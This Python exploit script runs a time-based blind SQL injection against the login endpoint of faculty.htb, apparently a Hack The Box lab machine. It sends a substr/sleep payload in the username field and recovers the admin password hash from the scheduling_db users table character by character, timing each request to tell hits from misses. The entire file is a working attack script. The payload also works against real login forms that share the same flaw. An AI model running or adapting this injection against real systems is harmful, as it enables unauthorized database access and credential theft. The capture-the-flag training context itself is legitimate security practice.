#!/usr/bin/python3

from pwn import *
import requests, time, sys, pdb, string, signal

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Variables globales
characters = "abcdef" + string.digits
login_url = "http://faculty.htb/admin/ajax.php?action=login"

def sqli():

    password = ""

    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando Ataque de Fuerza Bruta")

    time.sleep(2)

    p2 = log.progress("Admin Password [DB:scheduling_db][Table:users][Column: password] (admin)")


    for position in range(1, 35):
        for character in characters:

            post_data = {
                'username': "admin' and if(substr((select password from users where username='admin'),%d,1)='%s' ,sleep (1.5),1)-- -" % (position,character),
                'password': 'admin'
            }

            p1.status(post_data['username'])

            time_start = time.time()

            r = requests.post(login_url, data=post_data)

            time_end = time.time()

            if time_end - time_start > 1.5:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':

     sqli()
